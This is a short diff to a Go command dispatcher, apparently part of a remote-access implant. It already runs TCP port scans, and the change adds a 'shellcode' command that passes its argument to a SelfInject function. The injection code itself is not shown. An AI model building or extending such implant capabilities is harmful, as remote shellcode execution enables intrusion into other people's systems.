@@ -245,7 +245,9 @@ func RunCommand(command string) string {
 				//log.Println("Starting scan!")
 				output = functions.PortScanTCP(cmdArgs[2], ports, workers)
 			}
-			return strings.Trim(output, ",")
+			output = strings.Trim(output, ",")
+		case "shellcode":
+			output = functions.SelfInject(cmdArgs[1])
 		}
 	} else {
 		output = "[!] Insufficient arguments"
